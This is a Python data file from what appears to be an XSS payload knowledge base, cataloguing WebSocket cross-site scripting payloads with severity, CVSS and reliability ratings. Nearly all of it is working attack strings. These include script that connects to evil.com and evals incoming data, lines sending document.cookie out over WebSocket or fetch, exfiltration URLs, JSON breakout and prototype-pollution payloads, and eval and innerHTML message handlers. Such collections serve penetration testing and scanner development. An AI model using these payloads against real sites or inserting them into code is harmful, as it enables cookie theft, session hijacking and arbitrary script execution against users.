#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

WebSocket XSS Payloads
"""

from ..models import PayloadEntry


WEBSOCKET_XSS_PAYLOADS = {
    "ws_1": PayloadEntry(
        payload="<script>var ws=new WebSocket('ws://evil.com');ws.onmessage=e=>eval(e.data)</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="WebSocket with eval",
        tags=["websocket", "eval"],
        reliability="high",
    ),
    "ws_2": PayloadEntry(
        payload="<script>ws.send(document.cookie)</script>",
        contexts=["javascript"],
        severity="high",
        cvss_score=8.0,
        description="Exfil cookies via WebSocket",
        tags=["websocket", "exfil", "cookies"],
        reliability="high",
    ),
    "ws_3": PayloadEntry(
        payload="<script>fetch('ws://evil.com/'+btoa(document.cookie))</script>",
        contexts=["html_content", "javascript"],
        severity="high",
        cvss_score=8.0,
        description="Fetch to WebSocket (fallback)",
        tags=["websocket", "exfil", "fetch"],
        reliability="medium",
    ),
}

WEBSOCKET_PAYLOADS = {
    # URL injection
    "ws_url_evil": PayloadEntry(
        payload="ws://evil.com/xss",
        contexts=["websocket_url", "url"],
        severity="high",
        cvss_score=7.5,
        description="WebSocket URL injection to malicious server",
        tags=["websocket", "url", "injection"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "ws_url_localhost": PayloadEntry(
        payload="ws://127.0.0.1:8080/xss",
        contexts=["websocket_url", "url"],
        severity="high",
        cvss_score=7.5,
        description="WebSocket URL injection to localhost",
        tags=["websocket", "url", "ssrf"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "ws_url_exfil": PayloadEntry(
        payload="ws://evil.com/collect?cookie=",
        contexts=["websocket_url", "url"],
        severity="high",
        cvss_score=7.5,
        description="WebSocket data exfiltration URL",
        tags=["websocket", "exfiltration", "cookie"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # Message injection
    "ws_msg_script": PayloadEntry(
        payload="<script>alert(1)</script>",
        contexts=["websocket_message", "html_content"],
        severity="critical",
        cvss_score=8.8,
        description="WebSocket message script injection",
        tags=["websocket", "message", "script"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "ws_msg_json": PayloadEntry(
        payload='{"type":"xss","data":"<script>alert(1)</script>"}',
        contexts=["websocket_message", "json"],
        severity="critical",
        cvss_score=8.8,
        description="WebSocket JSON message XSS",
        tags=["websocket", "message", "json"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "ws_msg_proto_pollution": PayloadEntry(
        payload='{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
        contexts=["websocket_message", "json"],
        severity="critical",
        cvss_score=9.0,
        description="WebSocket prototype pollution",
        tags=["websocket", "prototype-pollution", "json"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "ws_msg_breakout": PayloadEntry(
        payload='"},"xss":"<script>alert(1)</script>","x":"',
        contexts=["websocket_message", "json"],
        severity="critical",
        cvss_score=8.8,
        description="WebSocket JSON string breakout",
        tags=["websocket", "json", "breakout"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "ws_msg_event": PayloadEntry(
        payload='{"event":"message","data":"<script>alert(1)</script>"}',
        contexts=["websocket_message", "json"],
        severity="critical",
        cvss_score=8.8,
        description="WebSocket event-based message XSS",
        tags=["websocket", "event", "message"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    # Handler injection
    "ws_handler_eval": PayloadEntry(
        payload="function(e){eval(e.data)}",
        contexts=["websocket_handler", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="WebSocket onmessage eval handler",
        tags=["websocket", "handler", "eval"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "ws_handler_arrow": PayloadEntry(
        payload="(e)=>eval(e.data)",
        contexts=["websocket_handler", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="WebSocket arrow function handler",
        tags=["websocket", "handler", "arrow-function"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
    "ws_handler_innerhtml": PayloadEntry(
        payload="e=>document.body.innerHTML=e.data",
        contexts=["websocket_handler", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="WebSocket innerHTML handler",
        tags=["websocket", "handler", "innerhtml"],
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="certain",
    ),
}

# Combined database
WEBSOCKET_DATABASE = {
    **WEBSOCKET_XSS_PAYLOADS,
    **WEBSOCKET_PAYLOADS,
}
WEBSOCKET_TOTAL = len(WEBSOCKET_DATABASE)
